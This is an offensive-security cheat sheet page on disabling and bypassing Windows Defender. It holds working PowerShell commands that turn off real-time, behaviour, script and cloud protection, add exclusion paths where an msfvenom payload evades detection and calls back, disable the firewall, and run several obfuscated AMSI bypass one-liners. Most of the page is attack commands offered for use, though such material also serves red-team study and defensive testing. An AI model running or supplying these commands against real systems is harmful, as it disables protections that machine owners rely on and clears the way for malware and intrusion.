# Disable and Bypass Defender

## Check if Defender is enabled

```powershell
# Check if Defender is enabled
Get-MpComputerStatus
Get-MpComputerStatus | Select AntivirusEnabled

# Check if defensive modules are enabled
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

# Check if tamper protection is enabled
Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL
```

### Alternative Antivirus products

In some cases if it appears Defender is not enabled an alternative Antivirus solution may be in effect.

```bash
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

![](<../../.gitbook/assets/image (2039) (1).png>)

Decoding the value of ProductState to hex can help identify which Antivirus is enabled

```powershell
'0x{0:x}' -f <ProductState>
'0x{0:x}' -f 393472
```

From the values below anything that has a **10** starting from the fourth numerical position indicates **On** and anything else indicates **Off**. As below we can see BitDefender is enabled and Windows Defender is disabled.

![](<../../.gitbook/assets/image (2032).png>)

## Turning off features

```bash
# Disables realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behaviour monitoring
Set-MPPreference -DisableBehaviourMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Temp"

# Disables cloud detection
Set-MPPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MPPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MPPReference -DisableScriptScanning $true

# Leave Defender running and remove all definitions
Set-MpPreference -DisableIOAVProtection $true

# Turn off everything and set exclusion to "C:\Windows\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

### Bypassing with Path Exclusions

References above we see its possible to use PowerShell to exclude Windows Defender from taking action on certain paths using path exclusions.

```powershell
Add-MpPreference -ExclusionPath "C:\Temp"
```

Running curl on a `msfvenom` payload where the output folder is outside of the defined exclusion path:

![](<../../.gitbook/assets/image (2034).png>)

Running the same command again however, this time specifying the excluded path from Defender `C:\temp` we see Defender has not picked up the malware.

![](<../../.gitbook/assets/image (2038) (1).png>)

Over on the attackers machine we see the `msfvenom` payload has connected back. Under normal circumstances AV will have no issues discovering this msfvenom payload.

![](<../../.gitbook/assets/image (2036) (1).png>)

### Firewall

> ```bash
> Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
> ```

## AMSI Bypass

```bash
# Older bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

#  Base64 encoded
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

# Newer bypass through obfuscation
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."AssEmbly"."GETTYPe"(( "{6}{3}{1}{4}{2}{0}{5}" -f 'Util','A','Amsi','.Management.','utomation.','s','System' ) )."getfiElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sETVaLUE"( ${nULl},${tRuE} )

# Even Newser
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Different bypass through obfuscation
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

{% embed url="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" %}

{% embed url="https://amsi.fail" %}

{% hint style="danger" %}
These methods are considered exceptionally noisy.
{% endhint %}

{% hint style="info" %}
Requires local administrative access on the target system.
{% endhint %}

## Resources

{% embed url="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide" %}
